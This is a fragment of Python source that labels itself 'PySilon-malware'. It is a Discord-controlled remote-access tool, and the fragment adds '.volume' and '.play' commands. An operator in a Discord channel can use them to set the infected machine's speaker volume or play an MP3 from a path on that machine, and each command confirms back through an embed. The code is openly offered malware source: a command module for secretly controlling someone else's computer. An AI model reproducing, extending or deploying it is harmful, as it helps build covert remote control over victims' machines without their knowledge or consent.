from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
import threading
import os

elif message.content.startswith('.volume'):
    await message.delete()
    args = message.content.split()
    
    if len(args) < 2 or not args[1].isdigit():
        embed = discord.Embed(title="📛 Error", description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        volume_int = int(args[1])
        if 0 <= volume_int <= 100:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(volume_int / 100.0, None)
            
            embed = discord.Embed(title="🟢 Success", description=f'```Successfully set volume to {volume_int}%```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed)
            await reaction_msg.add_reaction('🔴')
        else:
            embed = discord.Embed(title="📛 Error", description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed)
            await reaction_msg.add_reaction('🔴')

elif message.content.startswith('.play'):
    await message.delete()
    audio_file = message.content[5:].strip().strip('"').strip("'")
    
    if not audio_file:
        embed = discord.Embed(title="📛 Error", description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    elif not audio_file.lower().endswith('.mp3') or not os.path.isfile(audio_file):
        embed = discord.Embed(title="📛 Error", description='```Not a valid file or path does not exist.```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        def play_audio(path):
            pygame.mixer.init()
            pygame.mixer.music.load(path)
            pygame.mixer.music.play()
            clock = pygame.time.Clock()
            while pygame.mixer.music.get_busy():
                clock.tick(10)
            pygame.mixer.quit()

        threading.Thread(target=play_audio, args=(audio_file,), daemon=True).start()
        embed = discord.Embed(title="🟢 Playing", description=f'```Playing: {os.path.basename(audio_file)}```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
